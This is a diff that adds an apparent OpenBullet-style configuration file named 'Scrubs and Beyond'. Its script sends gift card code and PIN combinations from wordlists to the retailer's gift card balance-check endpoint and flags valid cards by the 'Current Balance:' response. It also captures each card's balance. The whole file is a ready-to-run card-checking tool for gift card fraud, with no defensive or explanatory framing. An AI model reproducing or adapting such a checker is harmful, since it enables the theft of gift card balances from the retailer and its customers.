@@ -1,0 +1,39 @@
+[SETTINGS]
+{
+  "Name": "Scrubs and Beyond",
+  "SuggestedBots": 1,
+  "LastModified": "2018-09-20T03:42:07.0646895+00:00",
+  "AdditionalInfo": "",
+  "Author": "Radikal",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "Cards",
+  "AllowedWordlist2": "CardPin",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://www.scrubsandbeyond.com/giftcard/cart/quickCheck/" AutoRedirect=TRUE 
+  CONTENT "giftcard_code=<USER><PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-Prototype-Version: 1.7" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "Current Balance:" 
+  KEYCHAIN Failure OR 
+    KEY "Wrong or expired Gift Card Code. " 
+PARSE "<SOURCE>" LR "<p>Current Balance: <strong><span class=\"price\">$" "</span></strong" Recursive=FALSE -> CAP "Balance" "" "" 
